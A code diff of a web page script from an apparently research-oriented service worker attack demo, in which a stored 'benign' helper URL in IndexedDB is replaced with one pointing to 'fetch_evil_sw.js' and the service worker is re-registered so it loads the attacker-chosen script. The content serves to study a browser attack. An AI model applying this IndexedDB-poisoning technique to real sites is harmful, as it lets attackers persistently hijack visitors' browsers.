@@ -9,28 +9,30 @@
     <script src=https://storage.googleapis.com/code.getmdl.io/1.0.6/material.min.js></script>
     <link rel=stylesheet href=../../styles/main.css>
 	   <script type='text/javascript'>
-          const request = indexedDB.open('demo_db', 1);
-          
-          request.onupgradeneeded = function(event) {
-	   	 var db = event.target.result;
-	     	 db.createObjectStore('urls',{keyPath:'id'}); 
-		 var transaction = event.target.transaction;
+	  function create_db(){
+		  const request = indexedDB.open('demo_db', 1);
 
-		 transaction.oncomplete = function(event) {    
-			 var txn = db.transaction('urls','readwrite')
-			 txn.onsuccess =  function(ev){
-			     alert('Benign URL Added!!')
-			 }
-			 var store = txn.objectStore('urls')
-			 store.delete('report_url').onsuccess = ev => {
-				 var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/helper_scripts/fetch_sw.js'})
+		  request.onupgradeneeded = function(event) {
+			 var db = event.target.result;
+			 db.createObjectStore('urls',{keyPath:'id'}); 
+			 var transaction = event.target.transaction;
+
+			 transaction.oncomplete = function(event) {    
+				 var txn = db.transaction('urls','readwrite')
+				 txn.onsuccess =  function(ev){
+				     alert('Benign URL Added!!')
+				 }
+				 var store = txn.objectStore('urls')
+				 
+				var db_op_req = store.add({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/helper_scripts/fetch_sw.js'})
 				 db_op_req.onsuccess = function(event) {
 				   if('serviceWorker' in navigator) {
 				      navigator.serviceWorker.register('./sw.js');
 				  };
 				};
-			 }			 
-		 }
+				 			 
+			 }
+		  }
 	  }
 
           
@@ -44,26 +46,26 @@
                          alert('URL Modified!!. Reload Page')
                      }
                      var store = txn.objectStore('urls')
-                     var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/helper_scripts/fetch_evil_sw.js'})
-                     db_op_req.onsuccess = function(event) { 
-			if('serviceWorker' in navigator) 
-			{
-			      navigator.serviceWorker.getRegistrations().then(function(registrations) {
-				    for(let registration of registrations) {
-					    registration.unregister()					   
-				    }
-			      }).then(function(){
-			      		 navigator.serviceWorker.register('./sw.js');
-			      }).catch(function(err) {
-					console.log('Service Worker registration failed: ', err);
-			      });
-			      
-			      
-		      	};
-		    }
+		     store.delete('report_url').onsuccess = ev => {
+			     var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/helper_scripts/fetch_evil_sw.js'})
+			     db_op_req.onsuccess = function(event) { 
+					if('serviceWorker' in navigator) 
+					{
+					      navigator.serviceWorker.getRegistrations().then(function(registrations) {
+						    for(let registration of registrations) {
+							    registration.unregister()					   
+						    }
+					      }).then(function(){
+							 navigator.serviceWorker.register('./sw.js');
+					      }).catch(function(err) {
+							console.log('Service Worker registration failed: ', err);
+					      });
+					};
+			    }
+		     }
               }
           }
-	  
+	  create_db()
           function refresh_image(){
 	  	var url = document.getElementById("img-demo").getAttribute("src");
 		fetch(url)
